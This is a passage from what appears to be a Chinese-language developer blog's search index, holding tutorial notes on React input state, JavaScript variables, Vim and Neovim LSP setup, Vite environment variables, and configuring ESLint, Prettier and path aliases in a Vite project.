用錯誤的做法 React 會跟你說 Component 從 Uncontrolled 變 Controlled。 這是因為如果把一個 props 設為 undefined ，React 就會視為沒有傳，然後當成 Uncontrolled。 附註：用 null 也會有一樣的問題，所以建議一律用空字串來當作初始值 1234// controlled &lt;input value={undefined} /&gt;// uncontrolled&lt;input value={\"\"} /&gt; 記得注意這個小細節～","link":"/2022/04/12/use-state-init-value-problem/"},{"title":"變數的命名哲學","text":"不過就一個變數還能扯哲學？ 語意在幫一個變數命名的時候，比較常見的做法是用「語意」來幫取名。也就是說這個變數代表的意思是什麼。 例如說我會把一個跟字串有關的變數命名為 str = 'string'，數字有關的命名為 num = 123，一個很直覺也很合理的命名方式。可是如果是 str = 3，或是 num = 'cool 的話，就非常不合理。 所以一個變數的「語意」很重要。如果你想找的是最大值，就乾脆一點叫 max 或是 maxNumber、maxValue 之類的都行，會比 num 或是 value 好，因為更明確一點。 語法其實只是想紀錄一下有哪幾種規則，跟順便學點單字： maxNumber (camel case)，小寫開頭，單字連接的部分變成大小。因為很像駱駝的背，所以被稱為駝峰式 MaxNumber (pascal case)，大寫開頭的駝峰式 max_value (snake case)，用底線隔開單字，底線像蛇所以才叫 snake max-value (kebab case)，用 - 隔開單字，kebab 是烤肉串的意思（因為這種寫法很像串燒） 不管你是用哪一種，請記得貫徹始終，不要一下 myHouese， 一下又 MyHouse，這樣是最糟糕的作法。 在 JavaScript 中最多也最常見的語法是「駝峰式命名」，所以基本上就按照這個語法來寫就好。 另外，大寫開頭的駝峰式通常是用在 Class 才會用到，所以沒事的話盡量不要亂用，以免混淆。","link":"/2021/12/21/variable-naming/"},{"title":"變數運算時該注意的幾件事","text":"基本但卻重要。 要注意資料型別一個很常見的例子是「字串 + 數字」： 12var a = 100console.log(a + '10') // '10010' 當「字串 + 任何東西時」，都會被強制轉成字串做「字串拼接」。 為了避免這種情況，當你想做的是數學運算時，請務必先轉換型態： Number(a) parseInt(a, 10)，第二個參數是代表 a 這個字串代表的是幾進位的數字 所以剛剛的把例子修正一下： 123var a = 100console.log(a + Number('10')) // 110console.log(a + parseInt('10', 10)) // 110 要注意浮點數誤差這個還蠻常忽略掉的，但浮點數很多時候跟你想的不一樣： 123var a = 0.1 + 0.2console.log(a === 0.3) //falseconsole.log(a) // 0.30000000000000004 不要懷疑人生，真的不一樣。 但簡單來說，浮點數會有「輸入值不精確」跟「溢位」的問題，非必要時盡量不要用浮點數。 補充：「溢位」指的就是超出記憶體可以儲存的位元數。","link":"/2021/12/17/variable-problem/"},{"title":"Vim－LSP 筆記","text":"其實我們每天都在用它，只是我們自己不知道。 什麼是 LSP？一個協議（Protocal），把程式編輯器分為 Sever 跟 Client 兩個部分： 就跟網頁開發中的前後端一樣，後端才是那個真正幫你檢查語法或格式是否正確的人，而前端則是負責幫處理你眼前畫面的那個人。 Neovim 內建就有包含 client 端的部分，可以讓你用一些 LSP 相關的 API 來顯示語法錯誤、高亮醒目等等的功能。 至於 server 的部分則需要自己安裝，以前端來說的話會用 npm install -g typescript-language-server 來處理。不過多虧有人寫了 nvim-lsp-installer ，所以可以省下自己安裝的功夫。 推薦網站 lsp-server_configurations 實際配置1. 安裝必要套件 12use \"neovim/nvim-lspconfig\"use \"williamboman/nvim-lsp-installer\" 2. 用 lsp-installer 安裝想要的 language server 1:LspInstallInfo 3. 寫配置檔（setup） 這邊先說個概念，理論上每一個語言都會有不同的 setup，所以如果你想把檔案結構拆的比較細的話，就會有蠻多檔案的。因此這邊為了方便理解先全部寫成在一個檔案裡： 12345678910111213141516171819-- lua/user/setup-- 引入套件local lsp_installer = require \"nvim-lsp-installer\"local lsp_config = require \"lspconfig\"-- 這個看起來是用來設定 installer 本身的 config，但其實是必要的一行，不可以拿掉。require(\"nvim-lsp-installer\").setup({ automatic_installation = true, -- 自動安裝（需重新重啟 neovim） ui = { icons = { server_installed = \"✓\", server_pending = \"➜\", server_uninstalled = \"✗\" } }})-- 一定要有這一行 setup 你的 language server 才會啟動lsp_config.sumneko_lua.setup{} 附註：其實 lspconfig 主要的用途就是讓你可以用比較簡單的方式來處理 code 而已，他本身是沒有任何 language server client 的功能的，詳細可以參考官方的 wiki 最後看到有出現語法檢查的效果就成功了。 關於 lsp_installer.on_server_ready()在一些舊的設定中你可能會看到這樣的寫法： 1234567891011121314151617181920212223242526272829303132local status_ok, lsp_installer = pcall(require, \"nvim-lsp-installer\")if not status_ok then returnend-- Register a handler that will be called for all installed servers.-- Alternatively, you may also register handlers on specific server instances instead (see example below).lsp_installer.on_server_ready(function(server) local opts = { on_attach = require(\"user.lsp.handlers\").on_attach, capabilities = require(\"user.lsp.handlers\").capabilities, } if server.name == \"jsonls\" then local jsonls_opts = require(\"user.lsp.settings.jsonls\") opts = vim.tbl_deep_extend(\"force\", jsonls_opts, opts) end if server.name == \"sumneko_lua\" then local sumneko_opts = require(\"user.lsp.settings.sumneko_lua\") opts = vim.tbl_deep_extend(\"force\", sumneko_opts, opts) end if server.name == \"pyright\" then local pyright_opts = require(\"user.lsp.settings.pyright\") opts = vim.tbl_deep_extend(\"force\", pyright_opts, opts) end -- This setup() function is exactly the same as lspconfig's setup function. -- Refer to https://github.com/neovim/nvim-lspconfig/blob/master/doc/server_configurations.md server:setup(opts)end) 官方現在已經不建議這樣寫了，可以到這個 issue 中參考詳細內容。 現在建議的寫法： 1234567-- 當作這行不存在（除非你想設置其他 config）require(\"nvim-lsp-installer\").setup {}local lspconfig = require(\"lspconfig\")lspconfig.sumneko_lua.setup {}lspconfig.tsserver.setup {}-- ... and so on 查看 LSP 連結狀態當你想寫一些配置的時候你可能會需要知道 client（一個 table）相關的資訊，這時候可以用 :lua print(vim.inspect(vim.lsp.buf_get_clients())) 來查看（這個很有用）。 我的 LSP config 快捷鍵配置12345678910111213141516171819202122local function lsp_keymaps(bufnr) local opts = { noremap = true, silent = true, buffer = bufnr } -- popup diagnostic vim.keymap.set('n', 'gl', vim.diagnostic.open_float, opts) -- 跳到下一個 diagnostic vim.keymap.set('n', '[d', vim.diagnostic.goto_prev, opts) -- 跳到前一個 diagnostic vim.keymap.set('n', ']d', vim.diagnostic.goto_next, opts) -- 顯示 diagnostic 列表 vim.keymap.set('n', '&lt;space&gt;q', vim.diagnostic.setloclist, opts) vim.keymap.set('n', 'gD', vim.lsp.buf.declaration, opts) vim.keymap.set('n', 'gd', vim.lsp.buf.definition, opts) vim.keymap.set('n', 'gr', vim.lsp.buf.references, opts) vim.keymap.set('n', 'gi', vim.lsp.buf.implementation, opts) -- 到那個 type 定義的地方 vim.keymap.set('n', 'gt', vim.lsp.buf.type_definition, opts) vim.keymap.set('n', 'D', vim.lsp.buf.hover, opts) vim.keymap.set('n', '&lt;C-s&gt;', vim.lsp.buf.signature_help, opts) vim.keymap.set('n', '&lt;F2&gt;', vim.lsp.buf.rename, opts) -- 對這個 diagnostic 做事情（例如：disable line） vim.keymap.set('n', '&lt;leader&gt;ca', vim.lsp.buf.code_action, opts)end","link":"/2022/10/19/vim-lsp-note/"},{"title":"Vim 筆記","text":"傳說中的 vim。 Vim 的三種模式基本上 Vim 會有三種模式，分別是： 普通模式（Normal Mode） 插入模式（Insert Mode） 選取模式（Visual Mode） 在一開始進入 vim 的時後預設會是普通模式，在這個模式中每一個鍵會有不同的功能，像是 d 可以用來刪除一排文字，a、o、 i 可以用來進入插入模式等等。 除此之外在普通模式中可以用 : 來下指令，所以最簡單的例子就是在普通模式中用 :q 下一個「我要離開」的指令，vim 接收到指令後才會帶你離開。 至於插入模式就是純粹的讓你「輸入任何文字」，每一個鍵就是單純代表某一個字，不像普通模式一樣會具有特定的功能。 順道一提，要從插入模式回到普通模式的方式很簡單：只要按下 ESC 或 Ctrl + [ 就行了 最後是插入模式，這個說穿了就只是讓你可以像滑鼠一樣做「選取」的動作而已。 其實可以插到你想插的地方前面有提到 a、i、o 這三個鍵都能用來進入插入模式，但這其實這不是什麼為了防呆來配置的各種快捷鍵，而是他們插入的方式不太一樣。 假設這是目前的狀態（注意游標的位置在 5）： 接下來如果我按下： i ，vim 就會自動幫我把游標插入到 5 的前面 a，vim 就會自動幫我把游標插入到 5 的後面 o，vim 就會自動幫我把游標插到下一行的位置 （我在進入後輸入的文字是表示目前是用哪個鍵來進入的，你只要注意我輸入後出現的位置在哪就好，這個就是上面的意思） 此外 A、I、O （可以搭配 shift）也可以用來進入插入模式，不過又會是另外一種插入的方式，但概念上都跟前面差不多。 離開 Vim 的方法在你還沒有輸入任何東西以前，可以用 :q 來離開。 可是一旦你進入「Insert 模式」並打了任何一個字，你就得用 :q! 來告訴 Vim 你不想保留任何修改，讓我離開就對了。 否則會出現這個警告： 1E37: No write since last change (add ! to override) 都說了是 :q! 不是 :!q在對這些指令不熟的時候常常會把指令給記錯，像我就很常把 :q! 打成 :!q，結果就會跳到這個奇怪的畫面： 後來發現其實 :! 的用途其實是「我要執行 Terminal 相關的指令」，所以當你執行 :!q 的時候就等同於直接在 Terminal 上執行 q 這個指令的意思，所以上面才會跳一段： 1zsh:1: command not found: q 就是在跟你說「沒有 q 這個指令哦」的意思。 所以 :q! 跟 :!q 雖然長得很類似，但實際用途卻是天差地遠，這一點要特別記住。 編輯器相關的設定 :set number 顯示行數（絕對位置） :set relativenumber 顯示行數（相對位置） :set mouser=a 開啟滑鼠功能（點擊、選取） set tabstop=2 tab 的寬度 set shiftwidth=2 縮排的寬度（通常會跟 tabstop 一樣） colorscheme default 主題色 syntax on 語法高亮 set expandtab 把 tab 替換成空白鍵 如果要套用為全域設定的話可以在 ~/.vimrc 中建立檔案，並填入內容： 123456789set numberset relativenumberset tabstop=2set shiftwidth=2set autoindentset mouse=acolorscheme defaultsyntax onset expandtab 普通模式中的相關的熱鍵 d 刪除 D 刪除游標後剩下的文字 y 複製（yanking） p 貼上（paste） u 取消動作（Undo） r 替換單個文字（replace） w 跳到下個單字（word） w 跳到下個單字（依據空格來跳） b 跳到前一個單字（back word） B 跳到前一個單字（依據空格來跳） e 跳到單字的最尾端（end of word） $ 跳到行內的終點（可以想成正則表達的 $） g_ 跳到行內的終點（可以想成正則表達的 $） 0 跳到行內的起始點（會回到那一行的最起點，無視縮排） ^ 跳到行內的起始點（跟 Home 鍵一樣的位置） _ 跳到行內的起始點（跟 Home 鍵一樣的位置） % 跳到成對符號起始 or 終點（例如 {） t* 跳到 * 的前一格（until） f* 跳到 * 的位置（find） dd 刪除整行 yy 複製整行 cc 只清除但不刪除行數，並開啟插入模式（change） gg 跳到檔案的最後一行（good game） zz 自動聚焦到畫面中央（根據游標位置） ctrl + r redo- shift + g 跳到檔案的第一行（shit game） shift + v 一次選取一行 ctrl + v 選取多個區塊 =G 對整個檔案做 indent &lt;&lt; / &gt;&gt; 往前 / 後 indent（單行） m + &lt;記憶鍵&gt; 設定記憶點（行數） ' + &lt;記憶鍵&gt; 跳回記憶點（行數） \" + * + y 把內容複製到系統的剪貼板（這樣才能貼到其他地方） &lt;number&gt; + gg 跳到指定的行數 gu / gU 快速切換大小寫 ~ 把目前游標上的字轉換成大小寫 組合技 dw 刪除單字 d2w 刪除兩個單字 diw 刪除游標內的單字（delete inner word） ciw 修改游標內的單字（change inner word） yiw 複製游標內的單字（yank inner word） ci( 改變 ( 內的文字（👍） yi( 複製 ( 內的文字（👍） di( 刪除 ( 內的文字（👍） (行數) + G 跳到指定的行數（或是直接下指令 :行數） :norm $a, 對選取的區塊執行這個動作（在最後面 appren 一個逗號） :! sort 把選取的文字做排序（unix only） gf 對目前檔案裡的路徑（字串）執行後就能打開那個檔案 *cgn. 替換掉多組相同的單字（詳細可以參考這篇） f&lt;letter&gt;; 當你用 f + &lt;letter&gt; 找到第一個字不是你想要的那一個，可以按 ; 來重複這個動作 搜尋要在 vim 裡面搜尋文字的話可以在普通模式中下「/ + 關鍵字」，就可以根據關鍵字來搜尋所有符合的文字。 如果要往下尋找可以按下 n，往前尋找可以按下 N。 或者是我想搜尋目前游標附近的單字，可以在那個單字旁邊用 * 或 # 來自動搜尋這個單字： 附註：* 是往下找，# 是往上找。 搜尋好了，可以不要再 highlight 了嗎？有些主題可能會自動把 match 的文字給 highlight 起來，這個是好功能是沒錯，但前提是不要在我已經經取消搜尋了還持續 highlight。 總之碰到這種問題的時候你可以重新用 / 搜尋一串無意義文字就能取消了。 跳躍到上個記憶點這招我覺得很值得學所以特別列一下，簡單來說就是你可以用 m + &lt;記憶點&gt; 來把這個行數給記起來，接著當你想跳回記憶點的時候只要用 ' + &lt;記憶點&gt; 就可以馬上跳回那當初的行數。 直接來看示範： 先原諒我這時候還不會設定 highlight，所以看起來很傷眼 QQ，不過這邊的重點是我先在 onSave 和 onAddFile 各別設定了記憶點，接著當我跳到其他地方要再跳回去時，我只要下： 1' + &lt;記憶點&gt; 就可以馬上跳回我當初記憶的地方，這個功能真的超方便的啦~ 取代檔案中的所有文字簡單來說就是對檔案中的字串做全域修改，用法是： 1:%s/&lt;舊字串&gt;/&lt;新字串&gt;/g 或者我也可以只選擇一個區塊來做修改： 1:s/&lt;舊字串&gt;/&lt;新字串&gt;/g 順道一提，如果不加上 g 的話只會把每一行第一個符合的字給替換掉，像這樣： 如果要替換的字剛好是 / 的話，可以改用其他的分隔符（delimiter）來取代，比較常見的會是 #：","link":"/2022/10/16/vim-note/"},{"title":"Vite－Environment Variable","text":"好用的環境變數。 預設的環境變數 import.meta.env.MODE 目前的環境（development / production） import.meta.env.BASE_URL 就是 base url import.meta.env.PROD 確認環境是不是 production（布林值） import.meta.env.DEV 確認環境是不是 development（布林值） import.meta.env.SSR 有沒有使用 SSR 添加 .env 檔案 .env .env.[mode] .env.local .env.[mode].local 附註一：[mode] 的值為 development 和 production附註二：.local 一般會用來存敏感資訊，所以不會被寫入 git 優先權為：.env.[mode].local &gt; .env.[mode] &gt; .env.local &gt; .env 一定要用 VITE 前綴字才可以存取到，例如說現在有底下這些環境變數： 12VITE_SOME_KEY=123DB_PASSWORD=foobar 那在存取的時候只能讀到 VITE_SOME_KEY，讀不到 DB_PASSWORD： 12console.log(import.meta.env.VITE_SOME_KEY) // 123console.log(import.meta.env.DB_PASSWORD) // undefined 自定義 .env 檔案如果預設提供的 .env.[mode] 不能滿足你要的環境，例如說你想要用一個 .env.demo 的檔案來存變數，所以寫了這樣的檔案： 12// .env.demoVITE_ENV_KEY=env.demo 那麽可以把 build 的指令改成這樣子： 123456\"scripts\": { \"dev\": \"vite\", \"build\": \"tsc &amp;&amp; vite build\", \"demo\": \"tsc &amp;&amp; vite build --mode demo\", // &lt;- new \"preview\": \"vite preview\"} 這樣子 vite 在打包的時就會更新 mode 的值，並讀取 .env.demo 這個檔案的內容。","link":"/2022/12/02/vite-environment-variable/"},{"title":"用 Vite 打造一個 Start Project","text":"也許該更早開始用這東西。 簡述在實際接手過幾項專案以後，我常常會看到一些程式碼風格與程式碼品質的問題，例如說： 到底該用單引號還是雙引號？ 到底縮排要空 2 格還是 4 格？要用 Tab 還是空格？ 該用箭頭函式還是普通函式？ 不會被改變的變數是不是該一律用 const 來宣告？ 沒用到的變數，或者是非必要的 console 是不是不該出現？ etc… 雖然這幾個問題可以說是跟個人喜好有關，但我覺得在團隊合作上應該還是要有一個明確的規範比較好，一來是讓整個專案有一致性，二來是能讓下一個接手的人可以有更好的開發體驗（？？？ 總之呢，這篇想要從頭開始用 Vite 來建立一個 Start Project，要整合的項目有： React TypeScript ESlint（airbnb） Prettier Enviroment Variable 步驟1. 建立 vite 專案（React + TypeScript）1npm create vite@latset 2. 初始化 ESLint這邊會透過 global eslint 的指令來初始化，如果你沒有的話記得先 npm install -g eslint： 1eslint --init 接下來依序選擇： To check syntax and find problems JavaScript modules (import/export) React (framework) Yes (TypeScript) Browser JSON Yes (install all needed dependencies) npm 根據剛剛的選擇，接下來應該會幫你安裝底下這幾個套件： eslint-plugin-react @typescript-eslint/eslint-plugin @typescript-eslint/parser eslint 可以到 package.json 中確認： 1234567891011\"devDependencies\": { \"@types/react\": \"^18.0.24\", \"@types/react-dom\": \"^18.0.8\", \"@typescript-eslint/eslint-plugin\": \"^5.45.0\", // &lt;- new \"@typescript-eslint/parser\": \"^5.45.0\", // &lt;- new \"@vitejs/plugin-react\": \"^2.2.0\", // &lt;- new \"eslint\": \"^8.28.0\", // &lt;- new \"eslint-plugin-react\": \"^7.31.11\", // &lt;- new \"typescript\": \"^4.6.4\", \"vite\": \"^3.2.3\"} 到目前為止，打開 .eslintrc.json 的內容應該會是大概像這樣子： 12345678910111213141516171819{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"eslint:recommended\", // &lt;- 這是預設的 config，等一會兒要換成 airbnb \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": {}} 如果你不知道這邊的內容是在設定什麼的話？可以到 ESlint - 配置一個 Airbnb 環境 參考，接下來我們要添加 airbnb 的 config。 3. 添加 airbnb 的規則首先要安裝 eslint-config-airbnb，我都把它稱為 airbnb 組合包，內容物包含多個 plugin 和一個 config： eslint-config-airbnb：根據底下的 plugin 來撰寫的 rules eslint-plugin-import：添加 import 相關的規則 eslint-plugin-jsx-a11y：添加 a11y 相關的規則 eslint-plugin-react：添加 react 相關的規則 eslint-plugin-react-hooks：添加 react hook 相關的規則 附註：再提醒一次，如果你不知道 config 跟 plugin 的差別，請參考 ESlint - 配置一個 Airbnb 環境 裝好後把 .eslintrc.json 的內容修改成以下： 1234567891011121314151617181920{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", // &lt;- update \"airbnb/hooks\", // &lt;- update \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": {}} 做到這邊後，你可以打開 App.tsx，然後加上 useEffect 來確認是否有讀取到對應的規則： 到目前為止，airbnb 的基本配置已經設定好了，接下來會先修復幾個你可能會碰到的問題。 4. 修復 import 的錯誤打開 main.tsx 後會看到有一個錯誤是不正確的，像這個： 照理說我們這樣的引入方式應該是沒有錯的，但是卻會顯示副檔名和找不到模組的錯誤訊息。原因的話我猜是因為這裡用的是 TypeScript，所以在解析 .tsx 檔案時會有一些相容性的問題。 解法方法是安裝 eslint-config-airbnb-typescript 並把 .eslintrc.json 的內容修改為底下這樣： 12345678910111213141516171819202122{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", // &lt;- 加上新的 config \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" // &lt;- 填入 tsconfig.json 的位置（有沒有 ./ 都可以） }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": {}} 簡單來說這邊做的事情是讓 ESLint 去透過 tsconfig.json 來解析 .tsx 相關的檔案，所以設定好後應該就能看到問題解決了： 附註：沒有剛剛的 import 問題了 5. 修復 vite.config.ts 的錯誤修正完剛剛的錯誤後打開 vite.config.ts 會發現另外一項錯誤： 簡單來說，這邊的意思是我們剛剛透過 parserOptions 讓 ESLint 用 tsconfig.json 來解析檔案，但 ESlint 發現 vite.config.ts 並沒有被包含在其中： 12345678910111213141516171819202122// tsconfig.json{ \"compilerOptions\": { \"target\": \"ESNext\", \"useDefineForClassFields\": true, \"lib\": [\"DOM\", \"DOM.Iterable\", \"ESNext\"], \"allowJs\": false, \"skipLibCheck\": true, \"esModuleInterop\": false, \"allowSyntheticDefaultImports\": true, \"strict\": true, \"forceConsistentCasingInFileNames\": true, \"module\": \"ESNext\", \"moduleResolution\": \"Node\", \"resolveJsonModule\": true, \"isolatedModules\": true, \"noEmit\": true, \"jsx\": \"react-jsx\" }, \"include\": [\"src\"], // &lt;- 只包含 src 底下的檔案 \"references\": [{ \"path\": \"./tsconfig.node.json\" }]} 解決的方式就是把 vite.config.ts 填進去就可以了： 123456789101112131415161718192021{ \"compilerOptions\": { \"target\": \"ESNext\", \"useDefineForClassFields\": true, \"lib\": [\"DOM\", \"DOM.Iterable\", \"ESNext\"], \"allowJs\": false, \"skipLibCheck\": true, \"esModuleInterop\": false, \"allowSyntheticDefaultImports\": true, \"strict\": true, \"forceConsistentCasingInFileNames\": true, \"module\": \"ESNext\", \"moduleResolution\": \"Node\", \"resolveJsonModule\": true, \"isolatedModules\": true, \"noEmit\": true, \"jsx\": \"react-jsx\" }, \"include\": [\"vite.config.ts\", \"src\"], // &lt;- 把 vite 加進去 \"references\": [{ \"path\": \"./tsconfig.node.json\" }]} 雖然變成了另一項錯誤（iport/no-extraneous-dependencies），但可以看到剛剛的錯誤確實消失了， 至於這個新的問題是在提醒我們是不是裝了沒用的 dependencies，不過以目前的 case 來說其實是有用的，建議到 .eslintrc.json 對這項 rules 調整一下就好： 1234567891011121314151617181920212223242526{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\", \"plugin:prettier/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": { // 加上這行 \"import/no-extraneous-dependencies\": [\"error\", { \"devDependencies\": true }] }} 6. 加入 prettier需要安裝的套件： prettier：core package eslint-plugin-prettier：添加 prettier 相關的規則 eslint-config-prettier：設定 prettier plugin 的 config 接下來要處理 prettier 和 ESLint 相衝的問題，所以一樣把 .eslintrc.json 修改成底下： 1234567891011121314151617181920212223{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\", \"plugin:prettier/recommended\" // &lt;- 請務必放在最後一個，這個順序是有意義的 ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], \"rules\": {}} 附註：這邊的寫法是官方推薦的簡化寫法，其實原本的寫法是這樣。 再強調一次一定要把 prettier 放在最後面，這樣子 ESLint 才會優先用 prettier 的規則來覆寫掉其他前面的規則，所以你應該會看到這樣的錯誤訊息： 注意現在這些規則都是來自 prettier，而不是前面的規則。意思是指 prettier 擁有最大的優先權，所以不管前面的規則如何最後都得聽 prettier 的，這樣子等一下在格式化的時候就不會出現衝突的問題。 到目前為止已經完成 prettier 和 ESLint 的配置，接下來要添加 prettier config 檔案。 7. 設定 prettier config接下來這邊就是團隊討論的時間了，這邊會透過 .prettierrc 來強制讓所有人的 prettier 用相同的條件去做格式化，這邊附上我個人比較偏好的設定： 123456789{ \"semi\": false, \"singleQuote\": true, \"jsxSingleQuote\": true, \"trailingComma\": \"none\", \"useTabs\": false, \"tabWidth\": 2, \"printWidth\": 100} 附註：這些規則等同於 ESLint 上的規則，所以沒有遵循的話也會出現提示訊息。 完成後執行 formatOnSave（VS-Code 的設定）以後就會看到所有 prettier 相關的訊息都消失囉： 8. 調整部分 rules設定完 prettier 以後，確實解決了和 ESLint 相衝的問題，不過還是會看到一些其他的錯誤訊息： 這邊的錯誤有三個： react/react-in-jsx-scope：沒有宣告 React（舊版的 React 需要） react/jsx-no-target-blank：當 target='_blank' 時需加上 rel=\"noreferrer\" 來避免安全性問題 @typescript-eslint/no-shadow：出現同名稱的變數（雖然不同 scope 之間互不影響，但會影響到可讀性） 以這三個問題來說，我自己認為第一、三項是非必要的規則，所以可以到 .eslintrc.json 把 rules 的部分修改成底下： 123456789101112131415161718192021222324252627{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\", \"plugin:prettier/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], // 新增兩個自訂的行為 \"rules\": { \"react/react-in-jsx-scope\": \"off\", \"@typescript-eslint/no-shadow\": \"off\" }} 附註：可以調整的參數有 off、warn、error。 修改完後就會看到只留下其他沒有被 off 的訊息： 特別寫這段只是想讓你知道其實你可以自己去決定 rules，ESLint 並沒有一定要依照某個 config 的規則，畢竟有些規則可能不適用於目前的專案（例如沒有宣告 React 的例子）。 到目前為止，已經處理好 ESLint 和 prettier 相關的設定。接下來會是一些和 vite 相關的額外需求，如果你對這些沒有興趣的話到這邊就可以結束了。 9. 讓 vite 結合 ESLint 功能如果你以前是用 CRA（Create React App） 來建立專案的話，應該會對這個討人厭的畫面很熟悉： 這邊想做的事情是讓 vite 可以結合 ESLint 的錯誤提示，讓 ESLint 一旦出現 Error 時就停止編譯，並產生跟 CRA 一樣的全屏警示： 附註：一種不照規則來就讓你沒辦法開發的概念 XD 實現的方式很簡單，首先安裝 vite-plugin-eslint，接著到 vite.config.ts 加入底下內容： 12345678import { defineConfig } from 'vite'import react from '@vitejs/plugin-react'import eslint from 'vite-plugin-eslint' // &lt;- new// https://vitejs.dev/config/export default defineConfig({ plugins: [react(), eslint()] // &lt;- new}) 設定完以後可以自己試著弄出一個 Error 看看，應該就會出現同樣的警示訊息了。 10. 設置 vite 在 import 時的 alias在開始之前先解釋一個重要觀念： VS-Code 是依據 tsconfig.json 的設定來顯示 import 路徑 Vite 是依據 vite.config.ts 的設定來編譯 import 路徑 也就是說，假設你現在把 tsconfig.json 的 baseUrl 設為 ./src，那 VS-Code 就會根據這項設定來顯示對應的路徑，這是正常的行為沒錯。 但接著重點來了，雖然在 VS-Code 上看似一切很完美，但 vite 可就不是這樣了，因為 vite 並不會根據 tsconfig.json 的設定下去編譯，所以你最後跑出來的結果會是有問題的： 附註：注意 VS-Code 確實有依照 tsconfig.json 的設定，所以在輸入 'App' 的時候才會出現對應的自動補齊。 所以這邊要處理的問題就是「確保兩邊的設定是同步的」。如果 tsconfig.json 說 baseUrl: './src'，那 vite.config.ts 就也要有相對應的設定來處理編譯時的路徑問題。 這邊你可以用官方提供的 alias 方式去處理，例如： 12345678910import * as path from 'path'export default defineConfig({ // ... resolve: { alias: { '@': path.resolve(__dirname, 'src') } }}) 這樣子 vite 在編譯時看到 @ 的時候就會自動當成是 src。 但我自己更推薦用 vite-tsconfig-paths 來處理。它是 vite 的一個 plugin，能夠讓 vite 自動根據 tsconfig.json 的設定下去做編譯，就不用自己處理同步的問題了。 安裝好後依照文件裡的說明把 vite-config-ts 修改成底下： 123456789import { defineConfig } from 'vite'import react from '@vitejs/plugin-react'import eslint from 'vite-plugin-eslint'import tsconfigPaths from 'vite-tsconfig-paths' // &lt;- new// https://vitejs.dev/config/export default defineConfig({ plugins: [react(), eslint(), tsconfigPaths()] // &lt;- new}) 這樣子 vite 的路徑就會直接參照 tsconfig.json 的 config 下去做編譯囉。 還沒完，還有另外一個問題如果你有用到 alias 的功能的話，會發現這時候換 ESLint 出來哀嚎了： 12345678910{ \"compilerOptions\": { \"target\": \"ESNext\", \"baseUrl\": \"./src\", \"paths\": { \"@/*\": [\"./*\"] // &lt;- alias } // ... }} 當時寫到這裡時腦海中突然想起 卡米狗 曾經說過的經典語錄： 工程師的日常就是除了一個錯之後看到的不是正常，而是看到下一個錯誤訊息。…要有耐心。 總而言之，這邊要做的事情跟剛剛差不多。剛剛是叫 vite 去讀 tsconfig.json 來做編譯，現在變成是叫 ESLint 去讀 tsconfig.json 來做 linting（因為 ESLint 不會自動去讀 tsconfig.json），所以要安裝另一個套件是：eslint-import-resolver-typescript 安裝好後把 .eslintrc.json 修改成底下： 123456789101112131415161718192021222324252627282930313233343536{ \"env\": { \"browser\": true, \"es2021\": true }, \"extends\": [ \"airbnb\", \"airbnb/hooks\", \"airbnb-typescript\", \"plugin:react/recommended\", \"plugin:@typescript-eslint/recommended\", \"plugin:prettier/recommended\" ], \"overrides\": [], \"parser\": \"@typescript-eslint/parser\", \"parserOptions\": { \"ecmaVersion\": \"latest\", \"sourceType\": \"module\", \"project\": \"tsconfig.json\" }, \"plugins\": [\"react\", \"@typescript-eslint\"], // 加上 settings 這段 \"settings\": { \"import/resolver\": { \"typescript\": { \"alwaysTryTypes\": true, \"project\": \"tsconfig.json\" } } }, \"rules\": { \"react/react-in-jsx-scope\": \"off\", \"@typescript-eslint/no-shadow\": \"off\", \"import/no-extraneous-dependencies\": [\"error\", { \"devDependencies\": true }] }} 調整完後應該就能看到錯誤消失囉： 11. 加上環境變數最後這一步是我自己工作上的需求，但我想說不定有人也有相同的需求所以就順便寫下來吧。 這邊對於環境變數的建立不會解釋太多，想知道細節的話可以參考 Vite Enviroment Variable 或 官方文件。 首先，這邊想切割的環境分別為： dev demo production 所以會建立 .env.dev、.env.demo、.env.production 這三個檔案。 接著我希望當我執行不同的 build 指令時能去讀取對應的環境變數檔案，所以 package.json 會修改成這樣： 1234567\"scripts\": { \"start\": \"vite\", \"build\": \"tsc &amp;&amp; vite build\", // &lt;- 讀取 .env.production \"demo\": \"tsc &amp;&amp; vite build --mode demo\", // &lt;- 讀取 .env.demo \"dev\": \"tsc 